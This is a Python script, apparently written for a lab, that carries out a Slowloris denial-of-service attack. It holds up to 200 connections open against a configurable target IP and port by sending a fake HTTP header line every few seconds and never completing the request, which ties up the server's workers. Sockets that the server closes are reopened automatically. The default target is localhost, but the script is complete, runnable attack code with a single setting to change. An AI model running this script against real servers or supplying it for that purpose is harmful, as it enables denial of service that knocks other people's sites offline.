"""
Slowloris attacker.

Opens many connections to the target server and, on each one, sends a
single valid HTTP header line every few seconds forever. It never sends
the blank line (\\r\\n\\r\\n) that marks the end of the HTTP headers, so
the server keeps waiting for "the rest of the request" and never frees
the worker that is handling that connection.

Run with:  python3 attacker.py
"""

import random
import socket
import time

# --- settings you can tweak -------------------------------------------------
TARGET_IP = "127.0.0.1"   # IP of the target web server
TARGET_PORT = 80          # port the web server listens on
NUM_SOCKETS = 200         # how many connections to hold open at once
INTERVAL = 10             # seconds between header sends (must be < server timeout)
# -----------------------------------------------------------------------------


def random_string(length=8):
    """A short random string, just to make each request line look unique."""
    letters = "abcdefghijklmnopqrstuvwxyz0123456789"
    return "".join(random.choice(letters) for _ in range(length))


def open_new_socket():
    """
    Open one TCP connection to the target and send the first two lines
    of an HTTP request: the request line and the Host header. Both are
    complete, valid lines, so the server has no reason to reject them.
    """
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(4)
    s.connect((TARGET_IP, TARGET_PORT))

    s.send(f"GET /?{random_string()} HTTP/1.1\r\n".encode())
    s.send(f"Host: {TARGET_IP}\r\n".encode())
    s.send(b"User-Agent: slowloris-lab\r\n")

    return s


def send_keepalive_header(s):
    """
    Send one more harmless header line to keep the connection's request
    "in progress" from the server's point of view. Never send the final
    blank line, that would complete the request.
    """
    header_name = f"X-Keepalive-{random_string(4)}"
    header_value = random_string(6)
    s.send(f"{header_name}: {header_value}\r\n".encode())


def main():
    print(f"Opening {NUM_SOCKETS} sockets to {TARGET_IP}:{TARGET_PORT} ...")

    sockets = []
    for i in range(NUM_SOCKETS):
        try:
            sockets.append(open_new_socket())
        except socket.error:
            # target refused/reset the connection, skip it for now
            pass

    print(f"{len(sockets)} sockets connected. Sending a header every "
          f"{INTERVAL}s on each, forever. Press Ctrl+C to stop.")

    while True:
        still_open = []
        for s in sockets:
            try:
                send_keepalive_header(s)
                still_open.append(s)
            except socket.error:
                # server closed this one (e.g. it hit a timeout), replace it
                try:
                    s.close()
                except socket.error:
                    pass
                try:
                    still_open.append(open_new_socket())
                except socket.error:
                    pass

        sockets = still_open
        print(f"[attacker] {len(sockets)} connections currently held open")
        time.sleep(INTERVAL)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\nStopped.")
